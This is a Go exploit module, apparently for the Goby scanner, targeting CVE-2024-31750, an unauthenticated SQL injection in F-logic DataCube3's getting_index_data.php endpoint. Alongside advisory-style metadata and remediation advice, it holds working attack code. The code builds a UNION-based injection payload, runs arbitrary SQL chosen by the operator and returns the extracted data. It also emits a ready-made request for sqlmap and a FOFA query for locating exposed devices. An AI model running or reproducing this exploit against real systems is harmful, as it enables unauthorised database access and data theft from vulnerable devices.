package exploits

import (
	"errors"
	"regexp"
	"strings"

	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
)

func init() {
	expJson := `{
    "Name": "F-logic DataCube3  /admin SQL Injection Vulnerability(CVE-2024-31750)",
    "Description": "<p>The F-logic DataCube3 measurement system version 1.0 has a SQL injection vulnerability in the interface at F-logic DataCube3 /admin/pr_monitor/getting_index_data.php. An unauthenticated attacker can exploit this vulnerability to obtain sensitive information from the database and, with further exploitation, gain control over the entire web server.</p>",
    "Product": "DataCube3",
    "Homepage": "https://www.f-logic.jp/info/2018/0509_2.html",
    "DisclosureDate": "2024-07-30",
    "PostTime": "2024-07-30",
    "Author": "1538279017@qq.com",
    "FofaQuery": "title==\"DataCube3\" && body=\"refs.btnLogin.click()\"",
    "GobyQuery": "title==\"DataCube3\" && body=\"refs.btnLogin.click()\"",
    "Level": "2",
    "Impact": "<p>Data Leakage: Attackers can retrieve sensitive information from databases, such as user credentials, personal details, or credit card data.</p><p>Data Manipulation: Attackers can alter data within the database, such as modifying user permissions, changing account balances, or other critical data.</p><p>Denial of Service (DoS): Attackers can disrupt database services by executing malicious SQL queries, causing system crashes or severe slowdowns.</p><p>Remote Code Execution: Attackers may exploit SQL injection to execute operating system-level commands, gaining control over servers or running malicious code.</p><p>Exploitation of Application Vulnerabilities: Attackers can leverage SQL injection vulnerabilities to discover additional application flaws, expanding their attack surface or perpetuating attacks.</p><p>Unauthorized Access: Attackers might use SQL injection to bypass authentication or access controls, gaining unauthorized access to sensitive areas of an application or database.</p>",
    "Recommendation": "<p>Parameterized Queries: Use parameterized queries or prepared statements to ensure that user input is not directly inserted into SQL statements, preventing injection attacks.</p><p>Input Validation: Rigorously validate user input to ensure only legitimate data formats are allowed, using whitelisting instead of blacklisting.</p><p>Use of ORM: Utilize Object-Relational Mapping (ORM) frameworks that can automatically handle SQL queries, reducing the chances of manually concatenating SQL statements.</p><p>Principle of Least Privilege: Ensure that database users have only the minimum permissions necessary to perform their tasks, limiting the potential damage an attacker could cause.</p><p>Regular Security Audits: Conduct regular code reviews and audits to identify and fix potential SQL injection vulnerabilities promptly.</p><p>Error Handling: Implement user-friendly error handling mechanisms to avoid displaying detailed error messages to users, preventing attackers from gaining system information.</p><p>Use of Web Application Firewall (WAF): Deploy a WAF to detect and block SQL injection attacks, enhancing the security of the system.</p><p>Monitoring and Logging: Monitor database activity and log anomalous behavior to detect and respond to potential attacks in a timely manner.</p>",
    "References": [
        "https://blog.csdn.net/qq_41904294/article/details/138006405"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "sql,sqlPoint",
            "show": ""
        },
        {
            "name": "sql",
            "type": "input",
            "value": "sqlite_version()",
            "show": "attackType=sql"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "SQL Injection",
        "HW-2024"
    ],
    "VulType": [
        "SQL Injection"
    ],
    "CVEIDs": [
        "CVE-2024-31750"
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9",
    "Translation": {
        "CN": {
            "Name": "F-logic DataCube3  /admin SQL 注入漏洞(CVE-2024-31750)",
            "Product": "DataCube3",
            "Description": "<p>F-logic DataCube3测量系统版本1.0,F-logic DataCube3&nbsp;/admin/pr_monitor/getting_index_data.php 接口处存在SQL注入漏洞，未经身份验证的攻击者可通过该漏洞获取数据库敏感信息，深入利用可控制整个web服务器。<br></p>",
            "Recommendation": "<p>参数化查询: 使用参数化查询或预编译语句，确保用户输入不会被直接插入到SQL语句中，从而避免注入攻击。输入验证: 对用户输入进行严格的验证，确保只允许合法的数据格式，使用白名单而非黑名单。</p><p>使用ORM: 使用对象关系映射（ORM）框架，可以自动处理SQL查询，减少手动拼接SQL语句的机会。</p><p>最小权限原则: 确保数据库用户仅具备执行其任务所需的最低权限，限制攻击者潜在的危害。</p><p>定期安全审计: 定期检查和审计代码，寻找可能的SQL注入漏洞，并及时修复。</p><p>错误处理: 实施友好的错误处理机制，避免向用户显示详细的错误信息，以防止攻击者获取系统信息。</p><p>使用Web应用防火墙（WAF）: 部署WAF来检测和阻止SQL注入攻击，提高系统的安全性。监控和日志记录: 监控数据库活动和记录异常行为，以便及时发现和响应潜在的攻击。<br></p>",
            "Impact": "<p>数据泄露: 攻击者可以通过SQL注入获取数据库中的敏感信息，如用户凭证、个人资料、信用卡数据等。</p><p>数据篡改: 攻击者可以修改数据库中的数据，例如篡改用户权限、更改账户余额或其他重要数据。</p><p>拒绝服务攻击 (DoS): 攻击者可以利用SQL注入导致数据库服务不可用，通过执行恶意的SQL语句使系统崩溃或变得极其缓慢。</p><p>应用程序漏洞利用: 攻击者可以通过SQL注入漏洞获取应用程序的其他漏洞信息，从而扩大攻击面或继续攻击。越权访问: 攻击者可能利用SQL注入来绕过身份验证或访问控制，获取未经授权的访问权限。</p>",
            "VulType": [
                "SQL注入"
            ],
            "Tags": [
                "SQL注入",
                "HW-2024"
            ]
        },
        "EN": {
            "Name": "F-logic DataCube3  /admin SQL Injection Vulnerability(CVE-2024-31750)",
            "Product": "DataCube3",
            "Description": "<p>The F-logic DataCube3 measurement system version 1.0 has a SQL injection vulnerability in the interface at F-logic DataCube3 /admin/pr_monitor/getting_index_data.php. An unauthenticated attacker can exploit this vulnerability to obtain sensitive information from the database and, with further exploitation, gain control over the entire web server.<br></p>",
            "Recommendation": "<p>Parameterized Queries: Use parameterized queries or prepared statements to ensure that user input is not directly inserted into SQL statements, preventing injection attacks.</p><p>Input Validation: Rigorously validate user input to ensure only legitimate data formats are allowed, using whitelisting instead of blacklisting.</p><p>Use of ORM: Utilize Object-Relational Mapping (ORM) frameworks that can automatically handle SQL queries, reducing the chances of manually concatenating SQL statements.</p><p>Principle of Least Privilege: Ensure that database users have only the minimum permissions necessary to perform their tasks, limiting the potential damage an attacker could cause.</p><p>Regular Security Audits: Conduct regular code reviews and audits to identify and fix potential SQL injection vulnerabilities promptly.</p><p>Error Handling: Implement user-friendly error handling mechanisms to avoid displaying detailed error messages to users, preventing attackers from gaining system information.</p><p>Use of Web Application Firewall (WAF): Deploy a WAF to detect and block SQL injection attacks, enhancing the security of the system.</p><p>Monitoring and Logging: Monitor database activity and log anomalous behavior to detect and respond to potential attacks in a timely manner.<br></p>",
            "Impact": "<p>Data Leakage: Attackers can retrieve sensitive information from databases, such as user credentials, personal details, or credit card data.</p><p>Data Manipulation: Attackers can alter data within the database, such as modifying user permissions, changing account balances, or other critical data.</p><p>Denial of Service (DoS): Attackers can disrupt database services by executing malicious SQL queries, causing system crashes or severe slowdowns.</p><p>Remote Code Execution: Attackers may exploit SQL injection to execute operating system-level commands, gaining control over servers or running malicious code.</p><p>Exploitation of Application Vulnerabilities: Attackers can leverage SQL injection vulnerabilities to discover additional application flaws, expanding their attack surface or perpetuating attacks.</p><p>Unauthorized Access: Attackers might use SQL injection to bypass authentication or access controls, gaining unauthorized access to sensitive areas of an application or database.<br></p>",
            "VulType": [
                "SQL Injection"
            ],
            "Tags": [
                "SQL Injection",
                "HW-2024"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Variables": {},
    "PocId": "10980"
}`

	sendPayloadbvmnkk := func(hostInfo *httpclient.FixUrl, sql string) (*httpclient.HttpResponse, error) {
		setPostRequest := func(hostInfo *httpclient.FixUrl, url string, payload string, head map[string]string) (*httpclient.HttpResponse, error) {
			postRequest := httpclient.NewPostRequestConfig(url)
			postRequest.Timeout = 15
			postRequest.VerifyTls = false
			postRequest.FollowRedirect = false
			postRequest.Data = payload
			for headName, headValue := range head {
				postRequest.Header.Store(headName, headValue)
			}
			return httpclient.DoHttpRequest(hostInfo, postRequest)
		}
		url := `/admin/pr_monitor/getting_index_data.php`
		body := "req_id=1) UNION select " + sql + ",2,3-- veaP"
		header := map[string]string{
			"User-Agent":      "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0",
			"Accept":          "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
			"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
			"Accept-Encoding": "gzip, deflate",
			"Dnt":             "1",
			"Referer":         hostInfo.FixedHostInfo,
			"Content-Type":    "application/x-www-form-urlencoded",
			"Cookie":          "SESS_IDS=prar0e5k1sg95nfsi446rejfp6",
		}
		resp, err := setPostRequest(hostInfo, url, body, header)
		if err != nil {
			return nil, err
		}
		if resp.StatusCode != 200 {
			return nil, errors.New("not response 200")
		}
		return resp, nil
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			sendPayload := sendPayloadbvmnkk
			// 默认是MySQL / MariaDB数据库 : 用DATABASE()查询数据库名，用CONCAT()拼接字符
			// PostgreSQL : 用current_database()查询数据库名，用CONCAT()拼接字符
			// SQLite : 用database_list查询数据库名，用||拼接字符,(select sql from sqlite_master)查询表名
			// SQL Server : 用DB_NAME()查询数据库名，用+拼接字符
			// Oracle : 用SELECT name FROM v$database查询数据库名，用concat()拼接字符
			sql := "CHAR(113,112,106,113,113)"
			resp, err := sendPayload(hostInfo, sql)
			if err != nil {
				return false
			}
			//检测逻辑
			// re := regexp.MustCompile(`"([^"]+)":\[\{"date":`)
			// // 查找第一个匹配项
			// match := re.FindStringSubmatch(resp.Utf8Html)
			// // 如果找到了匹配项，返回第一个捕获组的内容
			// if len(match) < 1 {
			// 	return false
			// }
			if !strings.Contains(resp.Utf8Html, "qpjqq") {
				return false
			}
			// 拼接SQL注入数据包的请求路径即可
			ss.VulURL = hostInfo.FixedHostInfo + `/admin/pr_monitor/getting_index_data.php`
			return true
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			sendPayload := sendPayloadbvmnkk
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			sql := goutils.B2S(stepLogs.Params["sql"])
			//Switch ExpParams 检查前面是否设置相关参数
			switch attackType {
			case "sql":
				resp, err := sendPayload(expResult.HostInfo, sql)
				if err != nil && strings.Contains(err.Error(), "not response 200") {
					expResult.Output = `漏洞利用失败:` + err.Error()
					expResult.Success = false
					return expResult
				}

				// 查找第一个匹配项
				re := regexp.MustCompile(`"([^"]+)":\[\{"date":`)
				match := re.FindStringSubmatch(resp.Utf8Html)
				if len(match) < 1 {
					//正则失败
					expResult.Output = `Exploitation failed.`
					expResult.Success = false
					return expResult
				}
				expResult.Success = true
				expResult.Output = `The key points you need to extract is : ` + match[1]
				return expResult

			case "sqlPoint":
				_, err := sendPayload(expResult.HostInfo, sql)
				if err != nil {
					expResult.Output = `Exploitation failed: ` + err.Error()
					expResult.Success = false
					return expResult
				}
				//sqlPoint,给用户跑sqlmap用
				expResult.Success = true
				expResult.Output = `POST /admin/pr_monitor/getting_index_data.php HTTP/1.1
Host: ` + expResult.HostInfo.HostInfo + `
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
Accept-Encoding: gzip, deflate
Connection: close
Cookie: SESS_IDS=prar0e5k1sg95nfsi446rejfp6
Content-Type: application/x-www-form-urlencoded

req_id=1*
`
				return expResult

			default:
				expResult.Output = `Unknown attack type: ` + attackType
				expResult.Success = false
				return expResult
			}
		},
	))
}
